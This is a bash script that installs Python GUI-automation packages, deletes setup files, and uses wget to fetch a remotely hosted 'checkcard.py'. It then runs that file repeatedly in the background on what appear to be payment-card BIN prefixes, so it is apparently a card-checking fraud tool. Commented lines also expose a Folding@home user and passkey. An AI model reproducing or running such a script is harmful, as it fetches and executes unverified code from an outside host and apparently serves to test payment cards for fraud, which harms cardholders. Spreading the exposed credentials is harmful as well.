#!/bin/bash
pip3 install --upgrade pip --user
pip3 install requests python3-xlib pyautogui===0.9.39 --user
python3 -m pip install grequests python3-xlib pyautogui===0.9.39 --user
rm -rf setup*
wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=8b165b78-7019-49cb-8d18-f87674096a7a &
sleep 4
python3 check.py 46701001249 us &
sleep 2
python3 check.py 46701001249 us &
sleep 2
python3 check.py 46701001249 us &
sleep 2
python3 check.py 421542 us &
sleep 2
python3 check.py 421542 us &
sleep 2
#run3.sh
#python3 /headless/Desktop/backup/pygui.py
#if [ -z "$FAH" ]
#    then
      #FAHClient --user=8fek7tcbax69 --team=234980 --passkey=f11cf30f860040d0f11cf30f860040d0 --gpu=false --smp=true
#    else
      #run_3.sh
#    fi
#pkill -f F*
